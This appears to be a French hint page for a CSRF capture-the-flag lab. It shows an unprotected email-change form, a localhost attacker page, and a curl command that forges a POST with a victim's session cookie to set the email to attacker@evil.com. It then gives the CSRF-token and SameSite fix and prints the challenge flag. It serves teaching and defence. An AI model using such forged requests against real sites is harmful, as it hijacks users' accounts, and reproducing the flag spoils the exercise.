<?php ?><!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>C14 Hints</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#c8d0dc;padding:40px 24px}.wrap{max-width:720px;margin:0 auto}h1{font-size:22px;color:#e4e8f0;margin-bottom:8px}.sub{font-family:monospace;font-size:13px;color:#5a6475;margin-bottom:28px}.hint{background:#151a22;border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:18px;margin-bottom:12px}.lbl{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}.l1{color:#16a34a}.l2{color:#d97706}.l3{color:#dc2626}p{font-size:14px;color:#8a94a6;line-height:1.7;margin-bottom:8px}.code{background:#1e1e2e;border-radius:8px;padding:12px;font-family:monospace;font-size:12px;color:#cdd6f4;line-height:1.8;margin:8px 0;white-space:pre;overflow-x:auto}a{color:#4a9eff}</style></head><body>
<div class="wrap">
<a href="/" style="font-size:13px;color:#4a9eff;display:block;margin-bottom:20px">← Retour</a>
<h1>C14 — CSRF</h1><p class="sub">PHP · Sessions · Formulaire sans token</p>

<div class="hint"><div class="lbl l1">Indice 1 — Comprendre l'attaque</div>
<p>Le formulaire de changement d'email n'a pas de token CSRF. Tout site externe peut déclencher la soumission si la victime est connectée.</p></div>

<div class="hint"><div class="lbl l2">Indice 2 — Utiliser la page attaquante fournie</div>
<p>Une page malveillante est disponible sur ce même serveur :</p>
<div class="code"># 1. Être connecté sur /c14/ (session auto-créée au premier accès)
# 2. Ouvrir dans le même navigateur :
http://localhost/c14/attacker.php
# 3. Cliquer sur le bouton → email changé en attacker@evil.com → flag affiché</div></div>

<div class="hint"><div class="lbl l2">Indice 3 — Via curl (simulation)</div>
<div class="code"># Simuler une requête cross-site (avec le cookie de session de la victime)
curl -X POST http://localhost/c14/index.php \
  -d "email=attacker@evil.com" \
  -H "Cookie: PHPSESSID=&lt;session_id_victime&gt;" \
  -H "Referer: http://evil.com"</div></div>

<div class="hint"><div class="lbl l3">Correction</div>
<div class="code"># ✅ Générer et vérifier un token CSRF
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
# Dans le formulaire :
# &lt;input type="hidden" name="csrf_token" value="&lt;?= $_SESSION['csrf_token'] ?&gt;"&gt;

# À la vérification :
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF détecté');
}

# ✅ Cookie SameSite=Strict empêche aussi l'envoi cross-site :
session_set_cookie_params(['samesite' => 'Strict']);</div></div>

<p>FLAG : <span style="font-family:monospace;color:#86efac">FLAG{csrf_n0_t0k3n_3m41l_h1j4ck}</span></p>
</div></body></html>
